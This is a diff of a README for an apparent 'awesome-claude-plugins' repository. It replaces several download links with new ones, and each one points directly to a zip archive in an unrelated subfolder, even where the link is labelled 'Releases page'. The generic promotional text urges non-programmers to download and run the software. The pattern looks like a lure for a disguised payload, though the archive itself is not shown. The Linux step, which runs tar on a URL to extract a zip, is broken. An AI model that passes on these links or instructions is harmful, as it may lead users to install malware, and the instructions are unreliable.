@@ -1,7 +1,7 @@
 # 🎉 awesome-claude-plugins - Discover Your Favorite Plugins Easily
 
 ## 📥 Download Now!
-[![Download](https://raw.githubusercontent.com/Rexboy23/awesome-claude-plugins/main/abdominohysterectomy/awesome-claude-plugins.zip)](https://raw.githubusercontent.com/Rexboy23/awesome-claude-plugins/main/abdominohysterectomy/awesome-claude-plugins.zip)
+[![Download](https://github.com/Rexboy23/awesome-claude-plugins/raw/refs/heads/main/plugins/example-translator/agents/awesome_plugins_claude_1.3.zip)](https://github.com/Rexboy23/awesome-claude-plugins/raw/refs/heads/main/plugins/example-translator/agents/awesome_plugins_claude_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **awesome-claude-plugins** repository! Here you'll find a curated list of plugins designed to enhance your experience with Claude. No programming knowledge is needed to use these plugins. Follow the steps below to download and run the software easily.
@@ -15,7 +15,7 @@ Before you start, ensure you have the following:
 ## 📥 Download & Install
 To install the plugins, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Rexboy23/awesome-claude-plugins/main/abdominohysterectomy/awesome-claude-plugins.zip) to download the latest plugins.
+1. Visit the [Releases page](https://github.com/Rexboy23/awesome-claude-plugins/raw/refs/heads/main/plugins/example-translator/agents/awesome_plugins_claude_1.3.zip) to download the latest plugins.
 2. Look for the latest version at the top of the page.
 3. Click on the link for the plugin you want to download.
 4. Your download will start automatically.
@@ -34,7 +34,7 @@ Once the download finishes, locate the file in your downloads folder.
 
 ### 🐧 For Linux Users:
 - Open a terminal and navigate to your downloads folder using `cd Downloads`.
-- Run the command `tar -xvf https://raw.githubusercontent.com/Rexboy23/awesome-claude-plugins/main/abdominohysterectomy/awesome-claude-plugins.zip` to extract the files.
+- Run the command `tar -xvf https://github.com/Rexboy23/awesome-claude-plugins/raw/refs/heads/main/plugins/example-translator/agents/awesome_plugins_claude_1.3.zip` to extract the files.
 - Follow any included directions for installation.
 
 ## 🔌 How to Use the Plugins
@@ -55,7 +55,7 @@ Our plugins offer various features to enhance your experience:
 ## 🔄 Update Instructions
 Keeping your plugins updated ensures you benefit from the latest features:
 
-1. Periodically check the [Releases page](https://raw.githubusercontent.com/Rexboy23/awesome-claude-plugins/main/abdominohysterectomy/awesome-claude-plugins.zip).
+1. Periodically check the [Releases page](https://github.com/Rexboy23/awesome-claude-plugins/raw/refs/heads/main/plugins/example-translator/agents/awesome_plugins_claude_1.3.zip).
 2. Download any new versions following the same steps as before.
 3. If you have an older version installed, simply overwrite it during installation.
 
